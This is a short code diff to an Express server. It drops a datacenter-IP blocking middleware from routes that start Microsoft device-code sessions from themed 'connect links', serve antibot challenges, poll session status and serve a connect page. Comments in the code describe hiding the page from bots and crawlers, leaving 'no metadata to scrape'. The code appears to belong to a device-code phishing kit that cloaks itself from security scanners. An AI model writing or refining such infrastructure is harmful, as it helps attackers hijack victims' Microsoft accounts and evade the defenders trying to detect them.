@@ -57,7 +57,7 @@ const {
   pollingLimiter,
   validateHeadersLight,
   validateHeadersStrict,
-  blockDatacenterIPs,
+
   generateChallenge,
   validateAntibot,
   cleanupExpiredChallenges,
@@ -457,10 +457,10 @@ app.delete("/microsoft/link/:linkId", requireAuth, async (req, res) => {
 });
 
 // Antibot: challenge endpoint
-app.get("/antibot/challenge/:linkId", generalLimiter, blockDatacenterIPs, validateHeadersLight, generateChallenge);
+app.get("/antibot/challenge/:linkId", generalLimiter, validateHeadersLight, generateChallenge);
 
 // Public: start a fresh device code session from a connect link
-app.post("/microsoft/start-session/:linkId", startSessionLimiter, blockDatacenterIPs, validateHeadersStrict, validateAntibot, async (req, res) => {
+app.post("/microsoft/start-session/:linkId", startSessionLimiter, validateHeadersStrict, validateAntibot, async (req, res) => {
   try {
     const { rows } = await pool.query("SELECT user_id FROM connect_links WHERE link_id = $1", [req.params.linkId]);
     if (rows.length === 0) {
@@ -521,7 +521,7 @@ app.post("/microsoft/start-session/:linkId", startSessionLimiter, blockDatacente
 });
 
 // Public: get connect link info (validates link exists)
-app.get("/microsoft/connect-info/:linkId", generalLimiter, blockDatacenterIPs, validateHeadersLight, async (req, res) => {
+app.get("/microsoft/connect-info/:linkId", generalLimiter, validateHeadersLight, async (req, res) => {
   try {
     const { rows } = await pool.query("SELECT id, theme FROM connect_links WHERE link_id = $1", [req.params.linkId]);
     if (rows.length === 0) {
@@ -535,7 +535,7 @@ app.get("/microsoft/connect-info/:linkId", generalLimiter, blockDatacenterIPs, v
 });
 
 // Public: poll session status
-app.get("/microsoft/session-status/:sessionId", pollingLimiter, blockDatacenterIPs, (req, res) => {
+app.get("/microsoft/session-status/:sessionId", pollingLimiter, (req, res) => {
   const session = deviceSessions.get(req.params.sessionId);
   if (!session) {
     return res.status(404).json({ error: "Session not found" });
@@ -857,7 +857,7 @@ if (isProduction) {
   const distPath = path.join(__dirname, "..", "dist");
 
   // Serve connect page — block bots, serve stripped HTML to real browsers
-  app.get("/connect/:linkId", blockDatacenterIPs, (req, res) => {
+  app.get("/connect/:linkId", (req, res) => {
     const ua = (req.headers["user-agent"] || "").toLowerCase();
 
     // Block all known bots/crawlers with empty response — no metadata to scrape
